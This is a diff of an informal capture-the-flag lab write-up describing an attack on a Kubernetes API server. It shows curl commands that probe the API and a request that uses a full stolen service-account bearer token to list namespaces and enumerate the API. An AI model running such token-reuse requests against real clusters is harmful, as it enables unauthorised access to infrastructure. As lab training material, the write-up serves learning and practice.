@@ -139,7 +139,10 @@ don't know what to do with the token and did some googling and found that it is 
 
 and i was stuck again don't  know what to do next so i tries lfi on the Kubernetes 
 
-	curl -k http:/10.10.231.27/:8443/kube-apiserver               
+	curl -k http:/10.10.231.27/:8443/kube-apiserver 
+	
+and  the response were 
+
 	<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 	<html><head>
 	<title>404 Not Found</title>
@@ -152,10 +155,13 @@ and i was stuck again don't  know what to do next so i tries lfi on the Kubernet
 and it responded so i tried to do more lfi but there was authentication problem so i did use the token as the header and did some googling about  "*curl kubernet"* 
 
 
-	curl -k -v https://10.10.231.27:8443/api/v1/namespaces/ --header "Authorization: Bearer  eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg4NDkxOTU4LCJpYXQiOjE2NTY5NTU5NTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2OTU5NTY1fSwibmJmIjoxNjU2OTU1OTU4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WyPc6fANUecUj16PKiAVvbzwt822FP7pnKAHAoIcTgKjr4AQj8HR-GHkJWphmKvnVWFH1OybzfYPUSD2rNKMQtVAEySoFI3jY9MQBshghoMtROyiYRQnBcuw_5LQcFczmSncP3kTc1KCbOzp_nnPoX4ndQLhkbcSfQ8ta9o4jtKMfWrTd3njbHNjZO_AQTOurFfXM3277ZfT7SWLt4KLC5hTVYl4lnJ6EjjgGr_k7V6zAEk1jSJIq7oud0ln-9XJvQR5bl1b8E2j9ooZQ8B1FyIGFxi1gb16EtM2uCFVL9hiBy83hatR6eqvgzQer-6X2g3I-zCF37eTLMi73PlPRg"
+	curl -k -v https://10.10.231.27:8443/api/v1/namespaces/ --header 
+	
+	"Authorization: Bearer  eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg4NDkxOTU4LCJpYXQiOjE2NTY5NTU5NTgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJpc2xhbmRzLTc2NTViNzc0OWYtenZxNTIiLCJ1aWQiOiJiMzEwNjkyMS00OTBhLTQ3NjctOGQ1OS03MmY2NjkxYmY5YzAifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImlzbGFuZHMiLCJ1aWQiOiI5OTIzOTA1OS00ZjZjLTQwNmItODI5NC01YTU1ZmJjMTQzYjAifSwid2FybmFmdGVyIjoxNjU2OTU5NTY1fSwibmJmIjoxNjU2OTU1OTU4LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDppc2xhbmRzIn0.WyPc6fANUecUj16PKiAVvbzwt822FP7pnKAHAoIcTgKjr4AQj8HR-GHkJWphmKvnVWFH1OybzfYPUSD2rNKMQtVAEySoFI3jY9MQBshghoMtROyiYRQnBcuw_5LQcFczmSncP3kTc1KCbOzp_nnPoX4ndQLhkbcSfQ8ta9o4jtKMfWrTd3njbHNjZO_AQTOurFfXM3277ZfT7SWLt4KLC5hTVYl4lnJ6EjjgGr_k7V6zAEk1jSJIq7oud0ln-9XJvQR5bl1b8E2j9ooZQ8B1FyIGFxi1gb16EtM2uCFVL9hiBy83hatR6eqvgzQer-6X2g3I-zCF37eTLMi73PlPRg"
 
 
-dfjklflk
+
+did some more enumuration
 
 	curl -k   https://10.10.236.174:8443/api/v1/ -H "Authorization: Bearer $TOKEN"
 	
